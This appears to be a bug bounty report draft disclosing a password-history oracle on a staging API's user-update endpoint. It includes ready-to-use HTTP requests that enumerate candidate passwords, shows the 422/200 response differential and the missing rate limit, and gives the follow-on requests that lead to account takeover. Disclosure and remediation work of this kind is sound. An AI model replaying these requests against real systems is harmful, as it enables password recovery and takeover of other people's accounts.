# BUG-009 Submission Draft (ready-to-paste)

**Title:** Password-history enumeration oracle via cross-account user write — rate-free recovery of arbitrary users' real passwords

**Severity:** P2 (depends on BUG-008's write primitive; distinct impact — password *disclosure*, not assignment. May be treated as BUG-008 impact amplification; technical content self-contained.)

**Asset:** https://bugbounty1.qe.optrostaging.ai

---

## Summary

BUG-008's missing object-level authorization on `PUT /api/v1/users/{id}` lets an Owner set another user's password. The same endpoint returns a **distinctive error when the candidate matches the target's current or historical password** (`422 "Password has been used"`) and applies the password on any other candidate (HTTP 200). This differential is a **password-history oracle**: an attacker can enumerate policy-compliant candidates and recover the victim's **real password**. The recovered password logs the attacker into the victim's UI session with zero artifacts (no forced password change), and the oracle path has **no rate limit** (3 attempts in 2.5s, no 429), while the dedicated `password-reset` endpoint does rate-limit (429 after ~3) — the missing control is an implementation gap.

## Steps (authorized dual-account test; victim = tester-owned account)

**1. History hit on a PAST password** (value was the victim's password during a rotation weeks before testing; no longer current):

```http
PUT /api/v1/users/231 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: <attacker_api_token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
X-Auditboard-Module: account
Content-Type: application/json

{"user":{"password":"ZzZtmpPw2!"}}
```

```json
{"errors":[{"detail":"Password has been used. Please choose another.","source":{"pointer":"data/attributes/password"},"disableGrowl":true}]}
```

HTTP 422 → the candidate **is/was** the victim's real password. (Oracle reads full history, not only the current value.)

**2. No rate limit** — three rapid PUTs with different candidates completed in 2.5 seconds total: `422` (hit), `200`, `200` (misses rotate the password). No 429/lockout/cooldown. For contrast, `POST /api/v1/users/password-reset` returns 429 after ~3 rapid attempts.

**3. ATO on either branch.** Miss branch: victim's password is now the attacker's candidate; clear the flag (BUG-008 chain) and log in:

```http
PUT /api/v1/users/231
{"user":{"requires_password_change":false}}

POST /api/v1/users/login
{"credentials":{"email":"<victim_email>","password":"<candidate>"}}
```

HTTP 200 with a full victim session. Hit branch: attacker logs into the UI with the victim's own password — no password-change residue, indistinguishable from the victim's legitimate login.

## Impact

- All 316 org users (incl. the role-1 Superuser) can have their **actual password recovered** by an Owner-role attacker.
- Offline-rate-free guessing constrained only by the org password policy; no current-password confirmation, no MFA on tested accounts.
- Recovered credentials may be reused on other systems (classic password-reuse exposure).

## Fix

1. Rate-limit/lockout on password-change failures (the `password-reset` 429 control already exists — apply it here).
2. Generic error for history collisions (never reveal membership).
3. Root cause: object-level authorization on user updates (BUG-008).
4. Alert on repeated `password_history` validation failures per actor.

## Notes for triage

- Same write primitive as BUG-008 (submitted) — if deduplicated, please consider as impact amplification: it converts password *assignment* into password *disclosure*.
- Not claimed: MFA-bypass behavior, cross-org reach, persistence beyond password state.
- Victim account state fully restored after testing.
